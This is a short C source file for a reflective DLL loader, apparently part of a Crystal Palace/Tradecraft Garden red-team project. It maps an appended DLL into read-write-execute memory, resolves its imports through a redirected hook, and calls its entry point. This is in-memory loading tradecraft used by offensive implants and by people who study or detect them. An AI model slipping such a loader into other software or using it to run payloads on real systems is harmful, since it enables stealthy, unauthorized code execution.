/*
 * RfUdrl - loader entry point.
 *
 * Structurally this is Tradecraft Garden's simple_rdll. The runtime setup this
 * project adds (exception directory, TLS callbacks, per-section protection) is
 * deliberately NOT referenced here: loader.spec redirects ProcessImports to
 * rdll_process_imports, so the setup is woven in instead. That is the point --
 * any other code that processes imports gets the setup too, not just our go().
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * Crystal Palace convention for reaching data linked into this PIC.
 * See link "my_data" in loader.spec.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));

static char * findAppendedDLL(void) {
	return (char *)&__DLLDATA__;
}

/*
 * Entry point. Crystal Palace puts this at offset 0 of the PIC (+gofirst).
 */
void go(void) {
	char        * src;
	char        * dst;
	DLLDATA       data;
	IMPORTFUNCS   funcs;

	src = findAppendedDLL();

	ParseDLL(src, &data);

	dst = KERNEL32$VirtualAlloc(NULL, SizeOfDLL(&data), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	LoadDLL(&data, src, dst);

	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* redirected to rdll_process_imports by loader.spec */
	ProcessImports(&funcs, &data, dst);

	EntryPoint(&data, dst)((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
}